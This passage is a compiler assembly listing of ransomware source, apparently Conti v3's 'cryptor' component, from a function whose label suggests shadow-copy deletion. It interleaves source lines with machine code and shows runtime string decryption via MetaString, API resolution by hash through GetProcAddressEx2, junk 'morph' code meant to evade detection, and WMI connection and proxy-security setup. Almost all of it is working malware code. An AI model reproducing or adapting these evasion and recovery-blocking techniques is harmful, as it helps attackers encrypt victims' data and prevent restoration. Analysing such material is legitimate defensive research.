  00502	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00506	b9 02 00 00 00	 mov	 ecx, 2
  0050b	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]
  0050f	2b cf		 sub	 ecx, edi
  00511	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00513	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00518	89 4c 24 50	 mov	 DWORD PTR _morph_var$13[rsp], ecx
  0051c	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$13[rsp]
  00520	f7 e9		 imul	 ecx
  00522	8b c2		 mov	 eax, edx
  00524	c1 e8 1f	 shr	 eax, 31
  00527	03 d0		 add	 edx, eax
  00529	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0052c	3b c8		 cmp	 ecx, eax
  0052e	75 23		 jne	 SHORT $LN836@DeleteShad
$LL831@DeleteShad:
  00530	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$13[rsp]
  00534	ff c0		 inc	 eax
  00536	89 44 24 50	 mov	 DWORD PTR _morph_var$13[rsp], eax
  0053a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0053f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$13[rsp]
  00543	f7 e9		 imul	 ecx
  00545	8b c2		 mov	 eax, edx
  00547	c1 e8 1f	 shr	 eax, 31
  0054a	03 d0		 add	 edx, eax
  0054c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0054f	3b c8		 cmp	 ecx, eax
  00551	74 dd		 je	 SHORT $LL831@DeleteShad
$LN836@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00553	40 88 75 88	 mov	 BYTE PTR $T1[rbp-256], sil
  00557	c6 45 89 15	 mov	 BYTE PTR $T1[rbp-255], 21
  0055b	c6 45 8a 55	 mov	 BYTE PTR $T1[rbp-254], 85 ; 00000055H
  0055f	c6 45 8b 15	 mov	 BYTE PTR $T1[rbp-253], 21
  00563	c6 45 8c 55	 mov	 BYTE PTR $T1[rbp-252], 85 ; 00000055H
  00567	c6 45 8d 76	 mov	 BYTE PTR $T1[rbp-251], 118 ; 00000076H
  0056b	c6 45 8e 55	 mov	 BYTE PTR $T1[rbp-250], 85 ; 00000055H
  0056f	c6 45 8f 3b	 mov	 BYTE PTR $T1[rbp-249], 59 ; 0000003bH
  00573	c6 45 90 55	 mov	 BYTE PTR $T1[rbp-248], 85 ; 00000055H
  00577	c6 45 91 35	 mov	 BYTE PTR $T1[rbp-247], 53 ; 00000035H
  0057b	c6 45 92 55	 mov	 BYTE PTR $T1[rbp-246], 85 ; 00000055H
  0057f	c6 45 93 43	 mov	 BYTE PTR $T1[rbp-245], 67 ; 00000043H
  00583	c6 45 94 55	 mov	 BYTE PTR $T1[rbp-244], 85 ; 00000055H
  00587	c6 45 95 29	 mov	 BYTE PTR $T1[rbp-243], 41 ; 00000029H
  0058b	c6 45 96 55	 mov	 BYTE PTR $T1[rbp-242], 85 ; 00000055H
  0058f	c6 45 97 1f	 mov	 BYTE PTR $T1[rbp-241], 31
  00593	c6 45 98 55	 mov	 BYTE PTR $T1[rbp-240], 85 ; 00000055H
  00597	c6 45 99 21	 mov	 BYTE PTR $T1[rbp-239], 33 ; 00000021H
  0059b	c6 45 9a 55	 mov	 BYTE PTR $T1[rbp-238], 85 ; 00000055H
  0059f	c6 45 9b 3b	 mov	 BYTE PTR $T1[rbp-237], 59 ; 0000003bH
  005a3	c6 45 9c 55	 mov	 BYTE PTR $T1[rbp-236], 85 ; 00000055H
  005a7	c6 45 9d 58	 mov	 BYTE PTR $T1[rbp-235], 88 ; 00000058H
  005ab	c6 45 9e 55	 mov	 BYTE PTR $T1[rbp-234], 85 ; 00000055H
  005af	c6 45 9f 3b	 mov	 BYTE PTR $T1[rbp-233], 59 ; 0000003bH
  005b3	c6 45 a0 55	 mov	 BYTE PTR $T1[rbp-232], 85 ; 00000055H
  005b7	c6 45 a1 1d	 mov	 BYTE PTR $T1[rbp-231], 29
  005bb	c6 45 a2 55	 mov	 BYTE PTR $T1[rbp-230], 85 ; 00000055H
  005bf	c6 45 a3 27	 mov	 BYTE PTR $T1[rbp-229], 39 ; 00000027H
  005c3	c6 45 a4 55	 mov	 BYTE PTR $T1[rbp-228], 85 ; 00000055H
  005c7	c6 45 a5 29	 mov	 BYTE PTR $T1[rbp-227], 41 ; 00000029H
  005cb	c6 45 a6 55	 mov	 BYTE PTR $T1[rbp-226], 85 ; 00000055H
  005cf	c6 45 a7 3f	 mov	 BYTE PTR $T1[rbp-225], 63 ; 0000003fH
  005d3	c6 45 a8 55	 mov	 BYTE PTR $T1[rbp-224], 85 ; 00000055H
  005d7	c6 45 a9 21	 mov	 BYTE PTR $T1[rbp-223], 33 ; 00000021H
  005db	c6 45 aa 55	 mov	 BYTE PTR $T1[rbp-222], 85 ; 00000055H
  005df	c6 45 ab 1d	 mov	 BYTE PTR $T1[rbp-221], 29
  005e3	c6 45 ac 55	 mov	 BYTE PTR $T1[rbp-220], 85 ; 00000055H
  005e7	c6 45 ad 3f	 mov	 BYTE PTR $T1[rbp-219], 63 ; 0000003fH
  005eb	c6 45 ae 55	 mov	 BYTE PTR $T1[rbp-218], 85 ; 00000055H
  005ef	c6 45 af 41	 mov	 BYTE PTR $T1[rbp-217], 65 ; 00000041H
  005f3	c6 45 b0 55	 mov	 BYTE PTR $T1[rbp-216], 85 ; 00000055H
  005f7	c6 45 b1 3b	 mov	 BYTE PTR $T1[rbp-215], 59 ; 0000003bH
  005fb	c6 45 b2 55	 mov	 BYTE PTR $T1[rbp-214], 85 ; 00000055H
  005ff	c6 45 b3 21	 mov	 BYTE PTR $T1[rbp-213], 33 ; 00000021H
  00603	c6 45 b4 55	 mov	 BYTE PTR $T1[rbp-212], 85 ; 00000055H
  00607	c6 45 b5 55	 mov	 BYTE PTR $T1[rbp-211], 85 ; 00000055H
  0060b	c6 45 b6 55	 mov	 BYTE PTR $T1[rbp-210], 85 ; 00000055H
  0060f	0f b6 45 89	 movzx	 eax, BYTE PTR $T1[rbp-255]

; 58   :         return m_isDecrypted;

  00613	0f b6 45 88	 movzx	 eax, BYTE PTR $T1[rbp-256]

; 63   :         if (!isDecrypted())

  00617	84 c0		 test	 al, al
  00619	75 54		 jne	 SHORT $LN945@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0061b	48 8b fe	 mov	 rdi, rsi
  0061e	66 90		 npad	 2
$LL946@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00620	0f b6 4c 3d 89	 movzx	 ecx, BYTE PTR $T1[rbp+rdi-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00625	b8 55 00 00 00	 mov	 eax, 85			; 00000055H
  0062a	2b c1		 sub	 eax, ecx
  0062c	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  0062f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00634	f7 e9		 imul	 ecx
  00636	03 d1		 add	 edx, ecx
  00638	c1 fa 06	 sar	 edx, 6
  0063b	8b c2		 mov	 eax, edx
  0063d	c1 e8 1f	 shr	 eax, 31
  00640	03 d0		 add	 edx, eax
  00642	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00645	2b c8		 sub	 ecx, eax
  00647	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0064c	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0064f	f7 e9		 imul	 ecx
  00651	03 d1		 add	 edx, ecx
  00653	c1 fa 06	 sar	 edx, 6
  00656	8b c2		 mov	 eax, edx
  00658	c1 e8 1f	 shr	 eax, 31
  0065b	03 d0		 add	 edx, eax
  0065d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00660	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00662	88 4c 3d 89	 mov	 BYTE PTR $T1[rbp+rdi-255], cl
  00666	48 ff c7	 inc	 rdi
  00669	48 83 ff 2e	 cmp	 rdi, 46			; 0000002eH
  0066d	72 b1		 jb	 SHORT $LL946@DeleteShad
$LN945@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1042 : 	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);

  0066f	ba 19 00 00 00	 mov	 edx, 25
  00674	41 b8 7d f5 de
	54		 mov	 r8d, 1423897981		; 54def57dH
  0067a	44 8d 4a fb	 lea	 r9d, QWORD PTR [rdx-5]
  0067e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1043 : 	return pFunction(psz);

  00683	48 8d 4d 89	 lea	 rcx, QWORD PTR $T1[rbp-255]
  00687	ff d0		 call	 rax

; 1051 : 	pFunction = (VOID(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xfc4ef6a9, 19);

  00689	ba 19 00 00 00	 mov	 edx, 25
  0068e	41 b8 a9 f6 4e
	fc		 mov	 r8d, -61933911		; fc4ef6a9H

; 1043 : 	return pFunction(psz);

  00694	48 8b d8	 mov	 rbx, rax

; 1051 : 	pFunction = (VOID(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xfc4ef6a9, 19);

  00697	44 8d 4a fa	 lea	 r9d, QWORD PTR [rdx-6]
  0069b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1052 : 	return pFunction(pvarg);

  006a0	48 8d 8d f0 00
	00 00		 lea	 rcx, QWORD PTR vArchitecture$24[rbp-256]
  006a7	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 133  : 		hres = pContext->SetValue(Arch, 0, &vArchitecture);

  006a9	48 8b 8d c0 00
	00 00		 mov	 rcx, QWORD PTR pContext$[rbp-256]
  006b0	4c 8d 8d f0 00
	00 00		 lea	 r9, QWORD PTR vArchitecture$24[rbp-256]
  006b7	66 44 89 bd f0
	00 00 00	 mov	 WORD PTR vArchitecture$24[rbp-256], r15w
  006bf	45 33 c0	 xor	 r8d, r8d
  006c2	c7 85 f8 00 00
	00 40 00 00 00	 mov	 DWORD PTR vArchitecture$24[rbp-248], 64 ; 00000040H
  006cc	48 8b d3	 mov	 rdx, rbx
  006cf	48 8b 39	 mov	 rdi, QWORD PTR [rcx]
  006d2	ff 57 40	 call	 QWORD PTR [rdi+64]
  006d5	8b d8		 mov	 ebx, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  006d7	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$15[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  006df	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$15[rsp]
  006e3	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  006e8	f7 ef		 imul	 edi
  006ea	8b ca		 mov	 ecx, edx
  006ec	c1 e9 1f	 shr	 ecx, 31
  006ef	03 d1		 add	 edx, ecx
  006f1	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  006f4	3b f9		 cmp	 edi, ecx
  006f6	74 4a		 je	 SHORT $LN968@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  006f8	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$15[rsp]
  006fc	83 c1 02	 add	 ecx, 2
  006ff	03 cb		 add	 ecx, ebx
  00701	89 4c 24 50	 mov	 DWORD PTR _morph_var$15[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00705	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]
  00709	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0070e	7d 07		 jge	 SHORT $LN1457@DeleteShad
  00710	ff c8		 dec	 eax
  00712	83 c8 fc	 or	 eax, -4
  00715	ff c0		 inc	 eax
$LN1457@DeleteShad:
  00717	85 c0		 test	 eax, eax
  00719	75 78		 jne	 SHORT $LN967@DeleteShad
  0071b	0f 1f 44 00 00	 npad	 5
$LL960@DeleteShad:
  00720	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]
  00724	ff c0		 inc	 eax
  00726	89 44 24 50	 mov	 DWORD PTR _morph_var$15[rsp], eax
  0072a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]
  0072e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00733	7d 07		 jge	 SHORT $LN1456@DeleteShad
  00735	ff c8		 dec	 eax
  00737	83 c8 fc	 or	 eax, -4
  0073a	ff c0		 inc	 eax
$LN1456@DeleteShad:
  0073c	85 c0		 test	 eax, eax
  0073e	74 e0		 je	 SHORT $LL960@DeleteShad

; 51   : 	}

  00740	eb 51		 jmp	 SHORT $LN967@DeleteShad
$LN968@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00742	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00746	b9 02 00 00 00	 mov	 ecx, 2
  0074b	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]
  0074f	2b cb		 sub	 ecx, ebx
  00751	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00753	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00758	89 4c 24 50	 mov	 DWORD PTR _morph_var$15[rsp], ecx
  0075c	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$15[rsp]
  00760	f7 e9		 imul	 ecx
  00762	8b c2		 mov	 eax, edx
  00764	c1 e8 1f	 shr	 eax, 31
  00767	03 d0		 add	 edx, eax
  00769	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0076c	3b c8		 cmp	 ecx, eax
  0076e	75 23		 jne	 SHORT $LN967@DeleteShad
$LL962@DeleteShad:
  00770	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$15[rsp]
  00774	ff c0		 inc	 eax
  00776	89 44 24 50	 mov	 DWORD PTR _morph_var$15[rsp], eax
  0077a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0077f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$15[rsp]
  00783	f7 e9		 imul	 ecx
  00785	8b c2		 mov	 eax, edx
  00787	c1 e8 1f	 shr	 eax, 31
  0078a	03 d0		 add	 edx, eax
  0078c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0078f	3b c8		 cmp	 ecx, eax
  00791	74 dd		 je	 SHORT $LL962@DeleteShad
$LN967@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1062 : 	pFunction = (HRESULT(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xbc7bf3e8, 18);

  00793	ba 19 00 00 00	 mov	 edx, 25
  00798	41 b8 e8 f3 7b
	bc		 mov	 r8d, -1132727320	; bc7bf3e8H
  0079e	44 8d 4a f9	 lea	 r9d, QWORD PTR [rdx-7]
  007a2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1063 : 	return pFunction(pvarg);

  007a7	48 8d 8d f0 00
	00 00		 lea	 rcx, QWORD PTR vArchitecture$24[rbp-256]
  007ae	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 139  : 		if (FAILED(hres))

  007b0	85 db		 test	 ebx, ebx
  007b2	0f 88 3b 03 00
	00		 js	 $LN1684@DeleteShad
$LN8@DeleteShad:

; 140  : 		{
; 141  : 			pCoUninitialize();
; 142  : 			return FALSE;                 // Program has failed.
; 143  : 		}
; 144  : 
; 145  : 	}
; 146  : 
; 147  : 	// Step 4: -----------------------------------------------------
; 148  : 	// Connect to WMI through the IWbemLocator::ConnectServer method
; 149  : 
; 150  : 	IWbemServices* pSvc = NULL;

  007b8	48 89 b5 a0 00
	00 00		 mov	 QWORD PTR pSvc$[rbp-256], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  007bf	40 88 74 24 70	 mov	 BYTE PTR $T2[rsp], sil
  007c4	c6 44 24 71 1f	 mov	 BYTE PTR $T2[rsp+1], 31
  007c9	c6 44 24 72 42	 mov	 BYTE PTR $T2[rsp+2], 66	; 00000042H
  007ce	c6 44 24 73 47	 mov	 BYTE PTR $T2[rsp+3], 71	; 00000047H
  007d3	c6 44 24 74 42	 mov	 BYTE PTR $T2[rsp+4], 66	; 00000042H
  007d8	c6 44 24 75 47	 mov	 BYTE PTR $T2[rsp+5], 71	; 00000047H
  007dd	c6 44 24 76 42	 mov	 BYTE PTR $T2[rsp+6], 66	; 00000042H
  007e2	c6 44 24 77 59	 mov	 BYTE PTR $T2[rsp+7], 89	; 00000059H
  007e7	c6 44 24 78 42	 mov	 BYTE PTR $T2[rsp+8], 66	; 00000042H
  007ec	c6 44 24 79 43	 mov	 BYTE PTR $T2[rsp+9], 67	; 00000043H
  007f1	c6 44 24 7a 42	 mov	 BYTE PTR $T2[rsp+10], 66 ; 00000042H
  007f6	c6 44 24 7b 68	 mov	 BYTE PTR $T2[rsp+11], 104 ; 00000068H
  007fb	c6 44 24 7c 42	 mov	 BYTE PTR $T2[rsp+12], 66 ; 00000042H
  00800	c6 44 24 7d 18	 mov	 BYTE PTR $T2[rsp+13], 24
  00805	c6 44 24 7e 42	 mov	 BYTE PTR $T2[rsp+14], 66 ; 00000042H
  0080a	c6 44 24 7f 0d	 mov	 BYTE PTR $T2[rsp+15], 13
  0080f	c6 45 80 42	 mov	 BYTE PTR $T2[rbp-240], 66 ; 00000042H
  00813	c6 45 81 14	 mov	 BYTE PTR $T2[rbp-239], 20
  00817	c6 45 82 42	 mov	 BYTE PTR $T2[rbp-238], 66 ; 00000042H
  0081b	c6 45 83 77	 mov	 BYTE PTR $T2[rbp-237], 119 ; 00000077H
  0081f	c6 45 84 42	 mov	 BYTE PTR $T2[rbp-236], 66 ; 00000042H
  00823	c6 45 85 42	 mov	 BYTE PTR $T2[rbp-235], 66 ; 00000042H
  00827	c6 45 86 42	 mov	 BYTE PTR $T2[rbp-234], 66 ; 00000042H
  0082b	0f b6 44 24 71	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00830	0f b6 44 24 70	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  00835	84 c0		 test	 al, al
  00837	75 56		 jne	 SHORT $LN764@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00839	48 8b fe	 mov	 rdi, rsi
  0083c	0f 1f 40 00	 npad	 4
$LL765@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00840	0f b6 4c 3c 71	 movzx	 ecx, BYTE PTR $T2[rsp+rdi+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00845	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0084a	2b c1		 sub	 eax, ecx
  0084c	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  0084f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00854	f7 e9		 imul	 ecx
  00856	03 d1		 add	 edx, ecx
  00858	c1 fa 06	 sar	 edx, 6
  0085b	8b c2		 mov	 eax, edx
  0085d	c1 e8 1f	 shr	 eax, 31
  00860	03 d0		 add	 edx, eax
  00862	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00865	2b c8		 sub	 ecx, eax
  00867	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0086c	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0086f	f7 e9		 imul	 ecx
  00871	03 d1		 add	 edx, ecx
  00873	c1 fa 06	 sar	 edx, 6
  00876	8b c2		 mov	 eax, edx
  00878	c1 e8 1f	 shr	 eax, 31
  0087b	03 d0		 add	 edx, eax
  0087d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00880	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00882	88 4c 3c 71	 mov	 BYTE PTR $T2[rsp+rdi+1], cl
  00886	48 ff c7	 inc	 rdi
  00889	48 83 ff 16	 cmp	 rdi, 22
  0088d	72 b1		 jb	 SHORT $LL765@DeleteShad
$LN764@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1042 : 	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);

  0088f	ba 19 00 00 00	 mov	 edx, 25
  00894	41 b8 7d f5 de
	54		 mov	 r8d, 1423897981		; 54def57dH
  0089a	44 8d 4a fb	 lea	 r9d, QWORD PTR [rdx-5]
  0089e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1043 : 	return pFunction(psz);

  008a3	48 8d 4c 24 71	 lea	 rcx, QWORD PTR $T2[rsp+1]
  008a8	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 157  : 	hres = pLoc->ConnectServer(

  008aa	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR pLoc$[rbp-256]
  008b1	48 8d 95 a0 00
	00 00		 lea	 rdx, QWORD PTR pSvc$[rbp-256]
  008b8	48 89 54 24 40	 mov	 QWORD PTR [rsp+64], rdx
  008bd	45 33 c9	 xor	 r9d, r9d
  008c0	48 8b 95 c0 00
	00 00		 mov	 rdx, QWORD PTR pContext$[rbp-256]
  008c7	45 33 c0	 xor	 r8d, r8d
  008ca	48 89 54 24 38	 mov	 QWORD PTR [rsp+56], rdx
  008cf	48 8b d0	 mov	 rdx, rax
  008d2	48 8b 39	 mov	 rdi, QWORD PTR [rcx]
  008d5	48 89 74 24 30	 mov	 QWORD PTR [rsp+48], rsi
  008da	89 74 24 28	 mov	 DWORD PTR [rsp+40], esi
  008de	48 89 74 24 20	 mov	 QWORD PTR [rsp+32], rsi
  008e3	ff 57 18	 call	 QWORD PTR [rdi+24]
  008e6	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  008e9	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$14[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  008f1	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$14[rsp]
  008f5	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  008fa	f7 ef		 imul	 edi
  008fc	8b ca		 mov	 ecx, edx
  008fe	c1 e9 1f	 shr	 ecx, 31
  00901	03 d1		 add	 edx, ecx
  00903	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  00906	3b f9		 cmp	 edi, ecx
  00908	74 58		 je	 SHORT $LN787@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  0090a	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$14[rsp]
  0090e	8b 85 a0 00 00
	00		 mov	 eax, DWORD PTR pSvc$[rbp-256]
  00914	83 c0 02	 add	 eax, 2
  00917	03 c8		 add	 ecx, eax
  00919	89 4c 24 50	 mov	 DWORD PTR _morph_var$14[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0091d	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]
  00921	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00926	7d 07		 jge	 SHORT $LN1454@DeleteShad
  00928	ff c8		 dec	 eax
  0092a	83 c8 fc	 or	 eax, -4
  0092d	ff c0		 inc	 eax
$LN1454@DeleteShad:
  0092f	85 c0		 test	 eax, eax
  00931	0f 85 8c 00 00
	00		 jne	 $LN786@DeleteShad
  00937	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL779@DeleteShad:
  00940	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]
  00944	ff c0		 inc	 eax
  00946	89 44 24 50	 mov	 DWORD PTR _morph_var$14[rsp], eax
  0094a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]
  0094e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00953	7d 07		 jge	 SHORT $LN1453@DeleteShad
  00955	ff c8		 dec	 eax
  00957	83 c8 fc	 or	 eax, -4
  0095a	ff c0		 inc	 eax
$LN1453@DeleteShad:
  0095c	85 c0		 test	 eax, eax
  0095e	74 e0		 je	 SHORT $LL779@DeleteShad

; 51   : 	}

  00960	eb 61		 jmp	 SHORT $LN786@DeleteShad
$LN787@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00962	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00966	b9 02 00 00 00	 mov	 ecx, 2
  0096b	2b 8d a0 00 00
	00		 sub	 ecx, DWORD PTR pSvc$[rbp-256]
  00971	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]
  00975	03 c1		 add	 eax, ecx
  00977	89 44 24 50	 mov	 DWORD PTR _morph_var$14[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0097b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00980	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$14[rsp]
  00984	f7 e9		 imul	 ecx
  00986	8b c2		 mov	 eax, edx
  00988	c1 e8 1f	 shr	 eax, 31
  0098b	03 d0		 add	 edx, eax
  0098d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00990	3b c8		 cmp	 ecx, eax
  00992	75 2f		 jne	 SHORT $LN786@DeleteShad
  00994	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL781@DeleteShad:
  009a0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$14[rsp]
  009a4	ff c0		 inc	 eax
  009a6	89 44 24 50	 mov	 DWORD PTR _morph_var$14[rsp], eax
  009aa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  009af	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$14[rsp]
  009b3	f7 e9		 imul	 ecx
  009b5	8b c2		 mov	 eax, edx
  009b7	c1 e8 1f	 shr	 eax, 31
  009ba	03 d0		 add	 edx, eax
  009bc	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  009bf	3b c8		 cmp	 ecx, eax
  009c1	74 dd		 je	 SHORT $LL781@DeleteShad
$LN786@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 170  : 	if (FAILED(hres))

  009c3	45 85 c0	 test	 r8d, r8d
  009c6	0f 88 1a 01 00
	00		 js	 $LN1683@DeleteShad

; 171  : 	{
; 172  : 
; 173  : 		pLoc->Release();
; 174  : 		pCoUninitialize();
; 175  : 		return FALSE;                // Program has failed.
; 176  : 	}
; 177  : 
; 178  : 	// Step 5: --------------------------------------------------
; 179  : 	// Set security levels on the proxy -------------------------
; 180  : 
; 181  : 	hres = (HRESULT)pCoSetProxyBlanket(

  009cc	48 8b bd a0 00
	00 00		 mov	 rdi, QWORD PTR pSvc$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 799  : 	pFunction = (HRESULT(WINAPI*)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x9b4ca937, 41);//GetProcAddress(hOle32, OBFA("CoSetProxyBlanket"));

  009d3	ba 18 00 00 00	 mov	 edx, 24
  009d8	41 b8 37 a9 4c
	9b		 mov	 r8d, -1689474761	; 9b4ca937H
  009de	44 8d 4a 11	 lea	 r9d, QWORD PTR [rdx+17]
  009e2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 800  : 	return pFunction(pProxy, dwAuthnSvc, dwAuthzSvc, pServerPrincName, dwAuthnLevel, dwImpLevel, pAuthInfo, dwCapabilities);

  009e7	89 74 24 38	 mov	 DWORD PTR [rsp+56], esi
  009eb	45 33 c9	 xor	 r9d, r9d
  009ee	48 89 74 24 30	 mov	 QWORD PTR [rsp+48], rsi
  009f3	45 33 c0	 xor	 r8d, r8d
  009f6	44 89 7c 24 28	 mov	 DWORD PTR [rsp+40], r15d
  009fb	48 8b cf	 mov	 rcx, rdi
